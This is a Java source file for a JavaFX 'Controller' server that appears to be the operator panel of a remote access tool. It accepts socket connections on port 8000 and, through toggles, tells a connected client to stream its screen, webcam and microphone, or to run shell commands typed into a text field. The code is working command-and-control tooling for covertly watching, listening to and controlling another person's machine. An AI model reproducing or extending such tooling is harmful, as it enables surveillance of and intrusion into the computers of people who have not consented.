package server;

import javafx.animation.FadeTransition;
import javafx.application.Application;
import javafx.geometry.Pos;
import javafx.scene.Group;
import javafx.scene.Node;
import javafx.scene.Scene;
import javafx.scene.canvas.Canvas;
import javafx.scene.canvas.GraphicsContext;
import javafx.scene.control.RadioButton;
import javafx.scene.control.TextField;
import javafx.scene.image.Image;
import javafx.scene.input.KeyCode;
import javafx.scene.layout.Background;
import javafx.scene.layout.BackgroundFill;
import javafx.scene.layout.GridPane;
import javafx.scene.paint.Color;
import javafx.stage.Stage;
import javafx.util.Duration;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

public class Server extends Application {

    private static final int WIDTH = 800, HEIGHT = 500;
    private static final int PORT = 8000;

    private ServerSocket socket;
    private Socket client;
    private Socket pivot;
    private Thread thread;

    private Canvas videoCaptureCanvas = new Canvas(500, 400);
    private Canvas cameraCaptureCanvas = new Canvas(500, 400);

    private TextField cmdField = new TextField("Put your command here!");
    private String cmdFieldText;

    private boolean startVideoCapture, startCameraCapture, startAudioCapture, startCMDCapture;

    private static final String image_PATH = "file:src/main/java/images/pic.jpg";

    public static void main(String[] args) {
        launch(args);
    }

    @Override
    public void start(Stage primaryStage) {
        Group mainGroup = new Group();
        GridPane pane = new GridPane();

        RadioButton cmdControl = new RadioButton();
        cmdControl.setTextFill(Color.WHITE);
        RadioButton videoCapture = new RadioButton();
        videoCapture.setTextFill(Color.WHITE);
        RadioButton audioCapture = new RadioButton();
        audioCapture.setTextFill(Color.WHITE);
        RadioButton cameraCapture = new RadioButton();
        cameraCapture.setTextFill(Color.WHITE);

        pane.add(cmdControl, 0, 0);
        pane.add(videoCapture, 0, 1);
        pane.add(audioCapture, 1, 0);
        pane.add(cameraCapture, 1, 1);
        pane.add(videoCaptureCanvas, 0, 2);
        pane.add(cameraCaptureCanvas, 1, 2);
        pane.add(cmdField, 0, 3);

        cmdControl.setText("CMD Control");
        videoCapture.setText("Video Control");
        audioCapture.setText("Audio Control");
        cameraCapture.setText("Camera Control");
        cmdField.setOpacity(0.1);

        pane.setVgap(10);
        pane.setPrefSize(WIDTH, HEIGHT);
        pane.setBackground(new Background(new BackgroundFill(Color.BLACK.brighter(), null, null)));

        pane.getChildren().get(0).translateYProperty().set(25);
        pane.getChildren().get(1).translateYProperty().set(25);
        pane.getChildren().get(2).translateYProperty().set(25);
        pane.getChildren().get(3).translateYProperty().set(25);
        pane.getChildren().get(4).translateYProperty().set(50);
        pane.getChildren().get(5).translateYProperty().set(50);
        pane.getChildren().get(6).translateYProperty().set(-80);

        pane.getChildren().get(0).translateXProperty().set(WIDTH / 2f - 150);
        pane.getChildren().get(1).translateXProperty().set(WIDTH / 2f - 150);
        pane.getChildren().get(2).translateXProperty().set(WIDTH / 2f - 500);
        pane.getChildren().get(3).translateXProperty().set(WIDTH / 2f - 500);
        pane.getChildren().get(4).translateXProperty().set(WIDTH / 2f - 400);
        pane.getChildren().get(5).translateXProperty().set(-60);
        pane.getChildren().get(6).translateXProperty().set(20);

        pane.setAlignment(Pos.CENTER_LEFT);
        mainGroup.getChildren().add(pane);
        Scene scene = new Scene(mainGroup, WIDTH, HEIGHT);

        FadeTransition appear = setFadeTransition(cmdField, 0.1f, 0.7f);
        FadeTransition fade = setFadeTransition(cmdField, 0.7f, 0.1f);

        videoCapture.setOnAction(actionEvent -> startVideoCapture = videoCapture.isSelected());
        cameraCapture.setOnAction(actionEvent -> startCameraCapture = cameraCapture.isSelected());

        cmdControl.setOnAction(actionEvent -> {
            startCMDCapture = cmdControl.isSelected();
            if (startCMDCapture){
                cmdField.setText("");
                appear.play();
            }
            else {
                cmdField.setText("");
                fade.play();
            }
        });

        cmdField.setOnKeyReleased(keyEvent -> {
            if (keyEvent.getCode() == KeyCode.ENTER)
                cmdFieldText = cmdField.getText();
        });
        audioCapture.setOnAction(actionEvent -> startAudioCapture = audioCapture.isSelected());

        setBlackBackground(cameraCaptureCanvas, 0, 0, 300, 250);
        setBlackBackground(videoCaptureCanvas, 25, 0, 400, 250);

        initServer(PORT);
        thread = new Thread(run(), "Main Window Thread");
        thread.start();

        primaryStage.setScene(scene);
        primaryStage.setResizable(false);
        primaryStage.setTitle("Controller");
        primaryStage.getIcons().add(new Image(image_PATH));
        primaryStage.show();
    }

    private void initServer(int port) {
        try {
            socket = new ServerSocket(port);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private Socket initClient() {
        try {
            return socket.accept();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    private FadeTransition setFadeTransition(Node node, float fromValue, float toValue) {
        FadeTransition fade = new FadeTransition(Duration.millis(3000), node);
        fade.setFromValue(fromValue);
        fade.setToValue(toValue);
        fade.setCycleCount(1);
        fade.setAutoReverse(false);
        return fade;
    }

    private Runnable run() {
        return () -> {
            System.out.println("Waiting for the Client!");

            /*
                Okay, reasons... so, technically i could have done a different thing
                like sending a specific byte for a specific capture action but that would mean
                that i need to close the socket. And if i close the socket, I would not have the chance
                to fetch the camera capture or the video capture. In a nutshell, that function would be overwritten.
                So therefore I did this.
            */

            while (thread.isAlive()) {

                if (startVideoCapture) {
                    pivot = initClient();
                    assert pivot != null;
                    try {
                        pivot.getOutputStream().write(0);
                        pivot.getOutputStream().close();
                        pivot.close();
                        client = initClient();
                        assert client != null;
                        new VideoCapture(videoCaptureCanvas, client.getInputStream());
                        client.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

                if (startCameraCapture) {
                    pivot = initClient();
                    assert pivot != null;
                    try {
                        pivot.getOutputStream().write(1);
                        pivot.getOutputStream().close();
                        pivot.close();
                        client = initClient();
                        assert client != null;
                        new CameraCapture(cameraCaptureCanvas, client.getInputStream());
                        client.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

                if (startAudioCapture) {
                    pivot = initClient();
                    assert pivot != null;
                    try {
                        pivot.getOutputStream().write(2);
                        pivot.getOutputStream().close();
                        pivot.close();
                        client = initClient();
                        assert client != null;
                        new AudioCapture(client.getInputStream());
                        client.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

                if (startCMDCapture) {
                    pivot = initClient();
                    assert pivot != null;
                    try {
                        pivot.getOutputStream().write(3);
                        pivot.getOutputStream().close();
                        pivot.close();
                        client = initClient();
                        assert client != null;
                        new CMDControl(client.getOutputStream(), cmdFieldText);
                        client.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

                try {
                    Thread.sleep(1000 / 60);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            try {
                thread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        };
    }

    private void setBlackBackground(Canvas canvas, int x, int y, int width, int height) {
        GraphicsContext cx = canvas.getGraphicsContext2D();
        cx.setFill(Color.BLACK);
        cx.fillRect(x, y, width, height);
    }
}
